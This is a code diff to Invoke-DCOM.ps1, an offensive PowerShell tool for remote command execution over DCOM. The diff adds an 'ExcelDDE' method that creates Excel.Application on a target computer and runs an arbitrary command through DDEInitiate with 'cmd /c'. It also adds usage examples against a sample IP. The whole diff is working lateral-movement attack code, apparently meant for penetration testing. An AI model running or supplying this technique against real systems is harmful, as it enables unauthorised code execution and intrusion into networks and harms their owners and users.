@@ -39,7 +39,8 @@ function Invoke-DCOM {
     .EXAMPLE
 
         Import-Module .\Invoke-DCOM.ps1
-        Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20 -Command "calc.exe"
+        Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command "calc.exe"
+        Invoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command "calc.exe"
         Invoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart "MyService"
 #>
 
@@ -51,7 +52,7 @@ function Invoke-DCOM {
 
         [Parameter(Mandatory = $true, Position = 1)]
         [ValidateSet("MMC20.Application", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart",
-        "DetectOffice","RegisterXLL")]
+        "DetectOffice","RegisterXLL","ExcelDDE")]
         [String]
         $Method = "MMC20.Application",
 
@@ -181,6 +182,12 @@ function Invoke-DCOM {
             $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
             $obj.Application.RegisterXLL("$DllPath")
+        }
+        elseif ($Method -Match "ExcelDDE") {
+
+            $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+            $Obj = [System.Activator]::CreateInstance($Com)
+            $obj.DDEInitiate("cmd", "/c $Command")
         }
     }
 
